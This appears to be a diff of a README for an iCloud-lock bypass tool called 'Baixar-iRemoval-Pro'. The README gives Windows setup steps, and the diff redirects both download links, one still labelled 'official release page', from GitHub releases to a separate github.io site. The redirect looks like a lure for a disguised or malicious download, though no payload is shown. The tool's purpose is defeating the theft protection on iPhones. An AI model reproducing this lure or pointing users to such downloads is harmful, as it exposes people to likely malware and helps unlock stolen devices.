@@ -1,6 +1,6 @@
 # 🚀 Baixar-iRemoval-Pro - Unlock iOS Devices On Your PC
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/naja21224904/Baixar-iRemoval-Pro/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://naja21224904.github.io)
 
 This guide helps you set up iRemoval Pro on your Windows computer. This tool helps users bypass iCloud locks on iOS devices. It works on Windows 10 and Windows 11. Follow these steps to prepare your computer, connect your hardware, and start the software.
 
@@ -18,7 +18,7 @@ To run this tool, your computer needs specific hardware and software. Ensure you
 ## 📥 Getting The Software
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/naja21224904/Baixar-iRemoval-Pro/releases).
+2. Go to the [official release page](https://naja21224904.github.io).
 3. Find the latest version listed at the top of the page.
 4. Click the link to download the file to your computer.
 5. Save the file to your desktop for easy access.
